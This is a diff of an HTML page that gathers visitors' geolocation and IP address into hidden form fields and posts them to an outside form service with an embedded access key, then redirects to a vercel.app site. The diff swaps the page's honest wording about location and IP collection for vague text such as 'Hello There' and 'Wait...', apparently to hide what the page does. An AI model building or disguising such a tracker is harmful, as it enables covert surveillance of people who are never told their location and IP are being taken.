@@ -21,15 +21,15 @@
     </style>
 </head>
 <body>
-    <h1>Location and IP Information</h1>
-    <p id="status-message">Please allow access to your location.</p>
+    <h1>Hello There</h1>
+    <p id="status-message">Hello</p>
 
     <form id="quoteForm" action="https://api.web3forms.com/submit" method="POST">
         <input type="hidden" name="access_key" value="dbf36f00-5696-49cb-abae-61ae931fbd57">
         <input type="hidden" id="latitude" name="latitude">
         <input type="hidden" id="longitude" name="longitude">
         <input type="hidden" id="ip_address" name="ip_address">
-        <input type="hidden" name="redirect" value="https://v.app">
+        <input type="hidden" name="redirect" value="https://position1212343.vercel.app">
         <button type="submit" id="submit-btn"></button>
     </form>
 
@@ -107,7 +107,7 @@
         }
 
         function submitIPOnly() {
-            document.getElementById("status-message").textContent = "Submitting with IP address only.";
+            document.getElementById("status-message").textContent = "Wait a little bit.";
             document.getElementById("latitude").value = "";
             document.getElementById("longitude").value = "";
             document.getElementById("ip_address").value = ipAddress;
@@ -117,7 +117,7 @@
         document.getElementById("location-btn").addEventListener("click", function() {
             locationAttempts = 0;
             this.style.display = "none";
-            document.getElementById("status-message").textContent = "Requesting location...";
+            document.getElementById("status-message").textContent = "Wait...";
             requestLocation();
         });
 
